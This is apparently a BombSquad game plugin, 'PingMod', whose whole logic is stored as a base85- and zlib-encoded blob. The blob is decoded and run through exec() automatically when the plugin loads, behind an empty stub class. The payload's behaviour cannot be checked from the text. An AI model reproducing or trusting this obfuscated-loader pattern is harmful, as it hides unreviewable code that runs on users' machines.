# PingMod.py - API 9  (نسخه‌ی کدگذاری‌شده)
# ساخته شده توسط Poya Azrael
# @AzraelMods لینک چنل
#
# این فایل به‌صورت فشرده/انکود ذخیره شده تا سورس اصلی مستقیم قابل خوندن نباشه.
# منطق واقعی موقع لود شدن پلاگین، در حافظه decompress و اجرا میشه؛
# از نظر عملکرد دقیقاً همون فایل قبلیه.

# ba_meta require api 9

import base64 as _b64_mod
import zlib as _zlib_mod
from babase import Plugin as _PluginBase

# --- استاب برای اسکنر متا (پلاگین واقعی پایین‌تر، بعد از دیکد شدن، جایگزینش میشه) ---
# ba_meta export plugin
class PingMod(_PluginBase):
    def on_app_running(self) -> None:
        pass

    def __del__(self):
        pass


_PAYLOAD = (
    "c-rMWU2hvllJEQ#oiU7?u_&69Y}pc)!Rc%{(Iv8UwgM;XH3lPcB#uqaaA$^=wK@T7L!u0vfZe;p;ug372jt<T$cYu&"
    "ava|Qe#rg_QhM_r*!u}rRoyew^F_-a8*J{Fctm#hR8?13SJ&6fDYjtQD|1f0)LvtwY<gjqO%_hE{?q<$|8akRu+931"
    "{R8~7KX?eO&)I^rX0YksxQ5w;fq%=t0RWE;Hjj4(-J`GBQFqWCY!*&I|LEu_>wh(P**`em>F>Y#?apAkzk9sH@G|JK"
    "K^I^?2JkQrMprb}KREh&ur=6*p*Rfbc+uaVV*PLXyMxXCE)W7uJ%IKYNE>YRpTe-g_F#(*wvKlY!To*@ZbQ-s4;cXK"
    ";`k5}VD3L*um1SkKmYJMruKU<t0x)*aJ%e({$uB#q3N){r{O4saUcHT>;-IuHrOr!rDJ#xbpU_^_TwX<WVe4vlLAr^"
    "*&crB4erxiaK1nOH-h~h=5b%}bt*AkVB9uR3$sx#8O>UN<R$Wxi3R9C1G2tF2zxY_7;XI>APzprk&uZI4g?QVL{1#w"
    ")cVl-0{S+O4gf3S-XR7b!+pGWkND8Vg+Y-3GT?$!4v5<317Iwy@*yxd?0{Jubpg&3Y1)DnurA0f&f6}|0M?Qi3m?GQ"
    "6GB2uxr@-c{e2kp4NV&^M_pXXJsbwK#JTw6qbjl*mKHkjvPTji$OC{qP8_s9832L65IzDhJw#kvC~PopFS+uZAv6>K"
    "XUUvaDioGor^R%Ax#M?SQ`ec*YCEpa4BK{m!?zsUD-=YVYX;vur*_BmgI|8bHH|v#%&@^~nc-baM#s8aVTQ++I#$%^"
    ")lAzI?H;FM$$(}vpkSfdS+VS(hhPLZcYNQmSFQSr>C^qIMP{_yh}Fg4zFE6dWM0iRO}k}!p0Q$LbGzd;iVW`2y|!7i"
    "jHVueSn*b6OigPkK-M-~f33ik!~6Q6&WZ`a!tB+LU}59hgw|Ipe6G)5xpIAGkyY8~`1x|-3;oKq`8j=YegRs>C&mkZ"
    "w|G^*KKsiV{CTcGKQGOHI)4p*tK}lY|Fy#6%;$?ybESl>rHf;Dt!VFgc7I`J%`QwW%wJnf@r#69E6gtFGRwv$%h;6S"
    "8nh)CCtA|HgN``+%B6F}z9Iug{>-=+9xX}sJ>~4X^y&PiPvRULFN@X`6M1ujk5OZqmAo%Q7=z2tjGNIxif2V|l&ZN0"
    "CD<3=kacl@6Gg?&58<bHRNygpAdZ3;aBO`~1_2#$c-wCLbUfY(&Qv&_dLaGX9BMegZ}2-m(%>sWKHixsT$=v$Qf##="
    "7s`07u~Y2SDWGr*fbR~vQ;e*OXM;^iJ>4HX;O8D3>ze{NHuShXLT4)=gQFT@aa2hWIuWWD+;GW6w#O|kT#F2JG0|j9"
    "ni--ZE8)ptdn)!TZig@xxY`3WFOGLK0vth3$u|o>0!a@{Of;P6FCOYoaRHw2Wly0B$xf=9i>PkS^9_;<ybC-!#ABU9"
    "RnR6=X!VmgP>j(E`T?jwk=Yk!(%|=@J(Mli+(IIYh%DAz6Auj}jn8Fa`s&Q5`i<Gkiyy;e#wumG`Qw?{k3L4Z8@m{5"
    "m*!sKhZMhF&;)nIq~qqDinAiCF-|Doal$^5Nc&{w3mMZG;Skr0TDXz{uDE4Nf{8o!Y-E&1b|<HZqnY`K&!#`U9>a7V"
    "ag5XT{CO=84X$EUVS@)C@0(oqBYQUnd-~ek%;gx@1Z<j%HXQszK(J5B3=P-*4>*qy4afvPSqIx3BdGA}Gcqc|Q4v=y"
    "pJ~UDfzH%dU;aTX!ln7ES7xt)N|>FSng5Jrp>&=gJi=W`J_V@F-6QVUp)M5e*cNbmpQz(@F7)GkNZ-Ls$XrGvm^)+p"
    "(xkYj^^^piOT_y>c2Et1g74y1;^!{<fiIGp_&CGqnL=uWS9CJ{n$TZIDDXX6Qkotxyi_WMdR{9HN06ygPlh7W?*d7%"
    "aJW&4Y`!VEpG%&N8XP4W*C2=FpM4RMhs${kK8?5$9p%r_lk35G!5teu<nZ{r(c@>w-!a1UEvg0ZbOsL)>UW3^ydB*$"
    "-Mgl%TWydtr80J*REGa5O4va*f0dmZM@3cZxUOmYdK-KjXoR5v!Evn>z2?}qS@U(@(aAx8-X*V;Y!!p+mKXG(kD)gl"
    "&*wK}^%M$)y1C4B+gwedQH^@t1&^l4kj^Sm3Ey1{iFBP6?5kcenx3gm6>uM}G@T`*$)af&nLJY(6XS_M5bF>;32$&s"
    "@D**A&51aPN#Znlc3HDm-<EKBF*Atg3!0)nn*<;-V>JOv=AsmG7BU#0v&glk;dxBQh}I%G&}!&Mmw1C<g`y~fmlUiz"
    "AkhYG{eskhh!zB47uXK_xI-S|;dk^k`|R>UY}1C(0ou8P?GgYk5C&Qi-LfrT*HzDKE(^@~@j7kORkc#sUpLH_V^<g5"
    "j;TeX;HHw>v2DInurmS;?MbL&dF2fj_N_LorWu16-G?9FU5hv1$6A)f;e(hwFvG6L<>3P%5NS9x8K-s!Cc%RoCH_Yh"
    "zoxI~vsY&pi$U*o^k*)AbZvT0%Y{|)Odo?2PRCa(Im3K|#1w~>@S+X{XV-m4T~dB^ue_ubnVPptv}_=m3=BSX!#4m5"
    "?qb1%l55uPqU5TTvX*;aLRYG}18EOB9lNfo(rn?RARcJ!46BsO<<byTV!e@4Rs}tZe5ffyhnt`h+2rJ8?x1XJ=DnKP"
    "4#Hg}v4&G8<v|`k0d<D{SdM*SfaT1A%a(04n?shA7O~cJyez3g&Sc*@6#47tF!Xj>d9P`jZQK!|rto~Hol-z?)k3Em"
    "s852cbCrpjR??$dtg}RNrG_VuWAolNo=3rP6WbD~`x}NYLWk<IGPg#F2R6ml;V@I>nQ0rW<*`?P-2C$ozf(AOldQq`"
    "qQv6V?!&kwAQ7nzX1cE90w!|<wsy^FI&M|1kh?$^X-^MdgEky5(wwdKo6Pt+DG@fifOC%2%f{5YtY0=T3-SBE%4xs%"
    "u+KgmwQz8v9~R|w$dBK|+yt4;lqeBd9<*w~CxinVhwh`5O6G5PBKLxn1=_HfT*9;tdU%vE_?ocnq1h}23ckTRLA?K7"
    "pPRqB__2O<dT!=ANdHZ4D3HDT5Fw+v0DM$99)Ju$F*rbNj|n#rO}{Wx(Zg>P=ZM-5(ZmKg53yIk-@-QP{feA~uK50)"
    "Xa!94caLoMfP$xB-ggmd;TCs{FpVW#Xc%~(XYTfdj{!W}1d^VLR7a2V4gPVZ(R6A?lb;zSzooC%jWssKoj`OP07|vY"
    "z!M>tA#9oerrnsC`Q-BS7y8WAh+}h(4FHhN#g6HTuQ$xP9sXEsbll+k71t8qt{Y%P2H!gz2F{LeH!yWqz`QhUv=MI`"
    "O`~b4EBacIt>`Vh1eP6qGuAvXtaPxb{05RW4l+M>vB>c6cscPm)pm=(+|CA*`LCS*H#T{TYv2_$ae+=aiz^dluCP~H"
    ")Yif_-cYB8IyFSI&~1kTdgtN%1~?;3rR%uH&YorGU@-qZIY|w0!bd|y+c|-8*>Rc0EStH84Z3KhC7X=_s*!4vc{eT2"
    "3@{9U<_}qgtUeX_&Q1dbU?`NSi8mkxU<H;n2Izu8(1ydb9E_DhiiUb2S^>_2uzQqUm<)Pt^iaY<$bhl(`SJLzr>mls"
    "H{)7NUYJA%jRQ{!#t6*g3{zu(&P@oDG6o1*3jsUAjt_BxCZf3k4wyp(ZWL46025X*8WYVdG4M2v<ET+cDr5Y6U7qTQ"
    "U|M2PD;0^wGKs%P3NtKgT)z`8D+C-iXQB<yH!uY5q~|nR%|KU>y~NwFX>Y@xy<L}%QZS`zcjBihxKd$aWh67}53OIJ"
    "N+M;?Rp437-U~l&AJhMsCQc=3$xTb0ptiFbxC@d-EF_IDY!1eGzPn7rl+zziot~RIeI2wHz=`g%z)wY2nim`>xH1#$"
    "7gZdDy0+nTTv(yXMQ%<jSc0HP(iE@?&9N*MD8Q_lhFc6^0@tJOuoMw7tEPDe*U3bZB;|cmj7H6WE5c4FbeJQIURKs`"
    "uWgjpZ@2JL-%#=mopqe^23waIw!zpxGB9oab&IV>RKTDJ$;ST+qes+><fN72^&$m*enFp`#<b45@~7v@6jRRP>G-FA"
    "!>?!X>#K+Vg5O7#je-s$Thmu9yH0X^)v-+xG)5Dq3x_?1Z$-rg1`rVo+9rn-K90hYSjq8_>Or~`1fd#>eZI-Q?SBX0"
    "4&zl3QRD^lBR7bGsq837kthEJnMs#KH}ADk*c2tv-gcd(rrDw{n$$D0$#81}>;4n-T1=H=`f>?}#%)4gQW7Wus_W@e"
    "K$J(7!4jk(=UxIe$nvt~wsga7nf1t73bzzAC37-iXCvOpGcyVJt5%)ti`7JX!?ac!7{6#l$V66;azx1et`MLwTM3s3"
    "(Dnc(^iRlxM;MOhY@tf4Jt~?BV#h&piZ8p!zP=>;7DLLRScU=pI34OymkR~Y9R&FyGPT1Pc$eos_WI8#vi;*DPCeG="
    "h=6?z3#^Jp@`na169_~q3blHI1YV&-arIyV4tP>c&@SMj*6tv$o{5x%5Le94aVt2eL!u<p9`U2wKO|}4GwOc@(t=rm"
    "9Lz}l3(67hQtpJZJ}+>yAn%`pR6gMRd>RlyUc{D2^=;D~-7sk(R*DiVoJ%CQd=wT(g{ldKPTogCilPCH)Br9{(Fn)W"
    "@1X$#utwP`*eGl)*11NV4d`s}&YbxR%8AV}N!$~4YdONDav7n#l3+w)A@S(uHGDj$pCN&~q6^d!B8@VU{T*3kvV;Vd"
    "=P~J!XCRR=i2=dPmYM#)CpjQeW&*H8Wti;&+InIi1m$?5AWr3e={K0=6xD1Ru78i`aN<#A<N@EX{llDPc#iszfyC@#"
    "LX6AxE&?Y_z=fP^_Lq1N0N^8j5O5DUaJ2{9(2-n-bnzbD1{))#m>BH#U36%X-YuTZA|->22~4o>V-<o!R2C5Zl-G=Q"
    "Y5G066f?aocvQ=A{GbS}isf;bbMOtzHeKGTCQf-YQK~E6s;b1~K+%fvfsSXPkx*4>>lFDWNeuF=-<VZ(wFrBrn24_%"
    "wzyvbyV!%H+EfzvVp|n!c4E!kf=Q<FqcMqmfgYcKk|pvkj#O7<$^pB4^PWG1Qz<NYYyvMBwa3`GJRVgpCYc17t6%}|"
    "K4uxkv<Y@KbTAuNfSom<%5)RGcZc?JR$~cB2CLCn#Q!y!$1>Y8v+ofLSKp0osE)@b1n(v?c~`jr<XuQ~@d8fWUu&CH"
    "#rt&!&?aWxG?vU}ReAO0ACxrT^?)Z6=X2#xs!~V;$YmaWjE?UB2h5sJIj(poP;JzF>#pIOXu>wDD1|q`xddafsR|<u"
    "Bkg%B64V3q57B5%?1#GLwP8~WUGTnydy+5E#8|d)qc@KMr*fu*m-9r~#UuJHBsoWEh{b?4&6Q<QX2g%VO)BG1lhxu_"
    "CEf2G9iZ~3^X!mY&JWW?WqA1Df!qtr%BTkXfP4@vA}>VQs#Pxx83v!5$_4akF5+d99G&ONtzu%xIqW!(mkHqurG`|n"
    "V+=3jfsd3La|wIOcq!p!L>>{jz)QZZgQ~(mSm$hD%<0@1tStPy7zMOktFAZAWz@Kn@mAl#TToUi<#NP&jNO344qU(h"
    "j%jyVrVH|~B3rb$ABsb3MZSAegSB*y2(7w^pb=KX@D|Mje!vXU>8iEh4kUJzxxo#Myc?1_?#*^ldN;vonmkG48%kb="
    "oPn>`e{nrX*X#k3KCF}~*<&QN7*@RHLmR3bPoyN@L|Gc`wrSUe$YdZJa-3nUmm1pRiK8wm^%|9*ya-Cg7^sN@Zu}mG"
    "Wo3KP(>P&3E|RFG;rSpbtNM}y%h!qvqS`cVz9V>aG*2u|SnVeFSd#EYY0u(GnhZ4XdjKAu4DWbmhuf_f(vo>DV5B+N"
    "i5P$e+KTBz{=_GFHUAtRW=6`TlRx!24r2s|DAb!imoVJMizc6Am098_!YaTpti;7!M3ridc=S6Xb`w{Xr-CZFpyD>D"
    "XjC#wHbudvA_4{E#naPe<k0Sk2ZF+yNq*ztrKlrEziYGqUzks$db_x6a4|DI(+>#-7sQui&oHA}0~0B5ZcSy}osOHO"
    "YY?Q7BUL6sizPILY7JswVvBUzbzDkeK&etmL9#1RU66{<CM++rZUvi5Kqzv{NTM)YLi)vH<7MT|Vz(i=UIR1&#f62m"
    "w7iw~K`(-N6N>WIETR-cxSb}heS)WAaC9f89;|j;L~O^WfpOF#?ZV@hiP5fETJAKPEyJ%hR9CrK9-SQd)##bCs#apR"
    "M!+yaa9WleNjz2hFSy`i+^dUW2h7>vrWkB1+Usda@gMd=r-{atdDm#FNJ5dVE4mKr()2Cc({*Kvt#52V>qZ<tOw00M"
    "gm2h2FpvmNku5hJ!`CQN$(u?Rrl)*!1<UZ#CRB(YD^vInErSJ7P?}aJCoC;Wr;nu21+P^=9g@G5VR?t3PVLPMCR4#+"
    "LOOqGy3S?mF7U{)XDCtfx~1J8JiuHVe_FD~J%-)~Ct23v8zKYM<Nk9r84f4_7KQJJ;fi)n;$%tgA0h82ITqwcLGi&E"
    "V8HYEBcVab^zh>TFm#)gP(ehv)iWe8JM|D-(brZUf>k4FuE^ji2KEDg{55W)z4~%1Oq=CA43SaqcB10Dm<o(cj@lhH"
    ">zRcj%L)SshKQ;`IhU6@?oP#@)SZ&%8CjxPA_+zXCRj12scI)asU;mACo)44ac1T{%kw=oWn*S4+t;DY>dz|q%SmSC"
    "AB3+Hp=zeEB*f&+&T5(cuQMzn4IJ0V;U)_j$bg9SYkZQ){53@&*Tt<Hn0$@y+!$hmBofuRn^PpLF<1I#3G0*XwFE<X"
    "k?KiIv}B-MT6)<DiUqSlz(q9stt_G7kpwAq9rk79v*m&j?BuFGBcq%LH#To;IgZ2f=!~GmIob-+HkHSf@^`B^o5;Dq"
    "=$A-i?D2;M`a20HK|I^njkyGgX-g^f_(b2OR^rV?@8q=-Fl$PE?eTa(_vHCzH7wi=6F=O)qGTX{kAz5E1&JtnDaoNm"
    "Zx7*5pKu;w#X*n)EiK^nhRB18VuV1F+GzQjb?G+YBAhYY6%YQLxwDGj#6l-=<P0uklmowGj6p6I7-7LvXT^B2z$lZR"
    "70Zf11kdgkS@7*`gAZ74Gc5j4$%;RO5BTQA9ioSH-zD%6uSZYj%Kn<_i=u-JU5yaQ6aelt>-OLH`0yB`a(})u9PwXX"
    "z@#@mq+~4i>W54*lU@W-WYUkf6}H)hHx@Pd%@cXj7JCWBy9!+JFu>1W+^qIbENt=jW2EFQ`J#+Wk&C}JqsZdF-&XJz"
    "!G?ch(M!CnBTxF0@9lV30hCH;fBrH^lliH|P=0SmS_<Q@+Q=3{`TZD07W?_OB1o^C7?QA`%nkIvUIOFq#dsG1Y#Obl"
    "x-peB&B^WfKOl`Tqognv@{LP0+tY?+U~=MXz&du#)SHe`H|v=XkI|IF8S{Y{n_(*9V;|DPb7yB4&Z34oORtKHxIwI_"
    "$lS>1L}<D%8G6g~4e()p-LYKofZ7(DjP-#3OK<PuFA?Jvzk)=SzgY~X5;~qJBJH*=o-*W;z(zkL_exr9jQ>>deHTf-"
    "$ng!mZZ^}8QKtkY@ra@$hsRGK3;zp!56uS"
)

exec(
    compile(
        _zlib_mod.decompress(_b64_mod.b85decode(_PAYLOAD)).decode("utf-8"),
        "<PingMod-protected>",
        "exec",
    ),
    globals(),
)
